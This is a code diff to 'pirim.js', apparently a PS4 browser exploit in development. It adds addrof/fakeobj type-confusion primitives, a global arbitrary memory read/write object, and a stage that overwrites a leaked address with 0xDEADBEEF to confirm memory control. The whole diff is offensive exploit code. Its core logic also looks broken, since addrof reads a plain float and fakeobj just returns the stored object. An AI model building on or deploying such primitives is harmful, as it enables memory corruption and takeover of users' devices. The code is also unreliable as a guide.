@@ -1,11 +1,12 @@
-// pirim.js - PS4-safe implementation with DEBUG INSTRUMENTATION
+// pirim.js - Enhanced PS4 memory primitive with addrof/fakeobj
 const memBuffers = {
     float64: new Float64Array(1),
-    u32: null
+    u32: new Uint32Array()
 };
 memBuffers.u32 = new Uint32Array(memBuffers.float64.buffer);
 
 var leak = null;
+var memory = null; // Will hold our memory access object
 
 function ftoi(val) {
     try {
@@ -30,6 +31,62 @@ function itof(val) {
     }
 }
 
+function initMemoryPrimitives() {
+    // Create our confusion objects
+    const holder = {};
+    const victim = [1.1, 2.2, 3.3];
+    holder.victim = victim;
+    
+    // Get the address of our victim array
+    const victimAddr = ftoi(victim[0]) & 0xffffffff;
+    log(`Victim array at: 0x${victimAddr.toString(16)}`, 'debug');
+    
+    // Implement addrof
+    window.addrof = function(obj) {
+        holder.victim = obj;
+        return ftoi(victim[0]) & 0xffffffff;
+    };
+    
+    // Implement fakeobj
+    window.fakeobj = function(addr) {
+        victim[0] = itof(addr | 0xfff00000);
+        return holder.victim;
+    };
+    
+    // Create memory access object
+    window.memory = {
+        read64(addr) {
+            const obj = fakeobj(addr - 0x10);
+            return ftoi(obj[0]);
+        },
+        
+        write64(addr, value) {
+            const obj = fakeobj(addr - 0x10);
+            obj[0] = itof(value);
+        },
+        
+        readBytes(addr, length) {
+            const result = new Uint8Array(length);
+            for (let i = 0; i < length; i += 4) {
+                const val = this.read64(addr + i);
+                const bytes = new Uint32Array([val]);
+                result.set(new Uint8Array(bytes.buffer), i);
+            }
+            return result;
+        }
+    };
+    
+    // Test the primitives
+    const testObj = { test: 123 };
+    const leakedAddr = addrof(testObj);
+    log(`addrof test: 0x${leakedAddr.toString(16)}`, 'info');
+    
+    const fake = fakeobj(leakedAddr);
+    log(`fakeobj test: ${fake === testObj}`, 'info');
+    
+    return true;
+}
+
 function pirim_stage1() {
     log("===== STAGE 1 START =====", 'info');
     leak = leakScope();
@@ -47,59 +104,60 @@ function pirim_stage2() {
     log("===== STAGE 2 START =====", 'info');
     
     try {
-        // 1. Create type-confused array
-        const confusedArray = [1.1, 2.2, 3.3];
-        confusedArray[0] = leak;  // Replace first element with our leaked object
+        // Initialize memory primitives first
+        if (!initMemoryPrimitives()) {
+            throw new Error("Failed to initialize memory primitives");
+        }
         
-        // 2. Create float view of the array
+        // Create type-confused array (original functionality)
+        const confusedArray = [1.1, 2.2, 3.3];
+        confusedArray[0] = leak;
+        
+        // Extract raw memory representation
         const floatView = new Float64Array(confusedArray.length);
         for (let i = 0; i < confusedArray.length; i++) {
             floatView[i] = confusedArray[i];
         }
         
-        // 3. Extract address from first element
+        // Get leaked address
         const leakedAddr = floatView[0];
         const addrValue = ftoi(leakedAddr);
-        const addrHex = addrValue.toString(16);
+        const addrHex = addrValue.toString(16).padStart(16, '0');
         
         log(`Leaked address: 0x${addrHex}`, 'info');
         
-        // 4. Verify if it's a valid pointer
+        // Memory test with distinctive pattern
         if (addrValue > 0x100000) {
             log(`Attempting memory test at 0x${addrHex}`, 'debug');
             
-            // Create memory access primitive
-            const memoryAccess = [itof(addrValue), {}];
-            const testValue = 0x11223344;
-            
-            // Save original value
-            const original = ftoi(memoryAccess[0]);
+            // Use our new memory primitive instead
+            const original = memory.read64(addrValue);
             log(`Original value: 0x${original.toString(16)}`, 'debug');
             
-            // Write test value
-            memoryAccess[0] = itof(testValue);
+            // Write distinctive pattern
+            memory.write64(addrValue, 0xDEADBEEF);
             
-            // Read back
-            const readBack = ftoi(memoryAccess[0]);
-            log(`Read back: 0x${readBack.toString(16)} vs Expected: 0x${testValue.toString(16)}`, 'debug');
+            // Read back verification
+            const readBack = memory.read64(addrValue);
+            log(`Read back: 0x${readBack.toString(16)} vs Expected: 0xDEADBEEF`, 'debug');
             
             // Restore original value
-            memoryAccess[0] = itof(original);
+            memory.write64(addrValue, original);
             
-            if (readBack === testValue) {
-                log("Memory control verified!", 'success');
+            if (readBack === 0xDEADBEEF) {
+                log("Memory control verified! ✓", 'success');
             } else {
                 log(`Test failed (got 0x${readBack.toString(16)})`, 'warn');
             }
         } else {
             log(`Address 0x${addrHex} too low, skipping test`, 'warn');
             
-            // Debug: Inspect the float values
-            log("Float view values:", 'debug');
+            // Enhanced debug output
+            log("Float view dump:", 'debug');
             for (let i = 0; i < floatView.length; i++) {
                 const val = floatView[i];
-                const hexVal = ftoi(val).toString(16);
-                log(`  [${i}]: ${val} (0x${hexVal})`, 'debug');
+                const hexVal = ftoi(val).toString(16).padStart(16, '0');
+                log(`  [${i}]: ${val} → 0x${hexVal}`, 'debug');
             }
         }
     } catch (e) {
